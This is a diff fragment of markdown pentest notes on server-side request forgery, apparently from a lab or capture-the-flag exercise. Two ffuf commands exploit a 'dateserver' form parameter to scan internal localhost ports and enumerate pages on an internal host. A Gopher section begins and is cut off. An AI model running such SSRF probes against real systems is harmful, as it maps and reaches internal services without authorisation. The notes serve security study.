@@ -6,15 +6,13 @@ https://blog.includesecurity.com/2023/03/mitigating-ssrf-in-2023/
 ```bash
 ffuf -w ports.txt -u http://10.129.82.103/index.php -X POST -d "dateserver=http://localhost:FUZZ&date=2024-01-01"  -H "Content-Type: application/x-www-form-urlencoded"  -fr 'Failed'
 ```
-[[ffuf]]
 
 ##### Fuzz to find available page
 ```bash
 ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
 ```
 
-##### Gopher
-[[gopher]]
+##### #Gopher
 Send arbitrary bytes to a TCP socket.
 Request:
 ```
